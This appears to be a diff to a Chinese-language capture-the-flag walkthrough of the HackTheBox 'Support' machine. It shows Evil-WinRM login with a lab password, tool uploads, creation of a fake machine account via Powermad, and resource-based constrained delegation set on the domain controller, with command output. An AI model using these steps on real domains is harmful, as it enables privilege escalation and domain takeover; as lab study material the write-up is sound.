@@ -595,15 +595,65 @@ Invoke-DNSUpdate.ps1  Powermad.ps1   Powermad.psm1
 LICENSE               Powermad.psd1  README.md
 [★]$ ls Rubeus/
 CHANGELOG.md  LICENSE  README.md  Rubeus  Rubeus.sln  Rubeus.yar
+```
+```
 //Rubeus.sln 不能在 Evil-WinRM 里编译；只能在你自己的 Windows 编译好，再上传 Rubeus.exe//疯了
 
 打开win11,下载了整个Rubeus压缩包，解压，点击 Rubeus.sln 使用VS2022打开
 [1]右键 Rubeus 项目,选择 重新加载项目,选择.NET Framework 4.8
 [2]生成 (Build) → 生成解决方案 。生成 exe，Rubeus\bin\Debug\Rubeus.exe
-
+[3]https://file.io //使用这个文件从windows机传送Rubeus.exe到pwnbox
+```
+```
 [★]$ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
 
-
+*Evil-WinRM* PS C:\Users\support\Documents> upload Rubeus.exe
+*Evil-WinRM* PS C:\Users\support\Documents> upload SharpHound.exe
+                                        
+*Evil-WinRM* PS C:\Users\support\Documents> . ./Powermad.ps1
 ```
 ### Creating a Computer Object //创建计算机对象
 #### 现在，让我们创建一台假计算机并将其添加到域。我们可以使用PowerMad的New-MachineAccount为了实现这个目标
+```
+*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force) 
+[+] Machine account FAKE-COMP01 added
+```
+#### 上面的命令将一台名称为FAKE-COMP01的机器添加到具有密码的域中Password123。我们可以用下面的命令验证这台新机器。
+```
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -identity FAKE-COMP01 
+
+
+DistinguishedName : CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb
+DNSHostName       : FAKE-COMP01.support.htb
+Enabled           : True
+Name              : FAKE-COMP01
+ObjectClass       : computer
+ObjectGUID        : d1be5a06-af1a-4a7f-8e60-3b7614905bf6
+SamAccountName    : FAKE-COMP01$
+SID               : S-1-5-21-1677581083-3380853377-188903654-6101
+UserPrincipalName :
+```
+#### 输出显示了FAKE-COMP01的详细信息，我们可以清楚地看到它被分配的SID值。
+### Configuring RBCD
+#### 接下来，我们需要通过以下两种方式之一配置基于资源的受限委托。我们可以通过内置将PrincipalsAllowedToDelegateToAccount值设置为FAKE-COMP01PowerShell Active Directory模块，它将自己配置msds-allowedtoactonbehalfofotheridentity属性，或者我们可以使用PowerView模块来直接设置msds-allowedtoactonbehalfofotheridentity属性。出于本演练的目的，我们将使用前者，因为它更容易理解。让我们使用Set-ADComputer命令用于配置RBCD。
+```
+*Evil-WinRM* PS C:\Users\support\Documents> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
+```
+### 为了验证该命令是否有效，我们可以使用Get-ADComputer命令。
+```
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
+
+
+DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb
+DNSHostName                          : dc.support.htb
+Enabled                              : True
+Name                                 : DC
+ObjectClass                          : computer
+ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127
+PrincipalsAllowedToDelegateToAccount : {CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb}
+SamAccountName                       : DC$
+SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000
+UserPrincipalName                    :
+```
+#### 如我们所见，PrincipalsAllowedToDelegateToAccount被设置为FAKE-COMP01，这意味着指挥工作。我们还可以验证代表其他身份的msds-allow的值。
+#### 正如我们所看到的，代表其他标识的msds- allowedtoaction现在有了一个值，但是因为类型这个属性是原始安全描述符，我们必须将字节转换为字符串才能理解发生什么事了。首先，让我们获取所需的值并将其转储到一个名为RawBytes的变量中。
